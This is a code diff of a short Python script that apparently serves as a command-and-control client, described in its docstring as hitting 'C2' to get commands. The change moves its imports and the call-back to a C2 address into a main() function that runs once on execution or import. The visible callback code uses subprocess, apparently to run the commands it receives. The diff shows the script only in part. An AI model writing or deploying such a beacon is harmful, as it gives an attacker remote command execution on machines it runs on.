@@ -2,13 +2,6 @@
 Hit dat C2, get dem commands
 """
 
-import socket
-import sys
-from subprocess import *
-
-SERVER_IP = "127.0.0.1:5000"    # C2 IP:port
-
-
 def get_ip():
     # Get the preffered IP of the local machine
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -31,5 +24,19 @@ def callback(ip, server):
     p.communicate()
     out.close()
 
-ip = get_ip()
-callback(ip, SERVER_IP)
+
+def main():
+    import socket
+    import sys
+    from subprocess import *
+
+    SERVER_IP = "127.0.0.1:5000"    # C2 IP:port
+    ip = get_ip()
+    callback(ip, SERVER_IP)
+
+import __main__
+try:
+    _ = __main__.isDep
+except:
+    __main__.isDep = True
+    main()
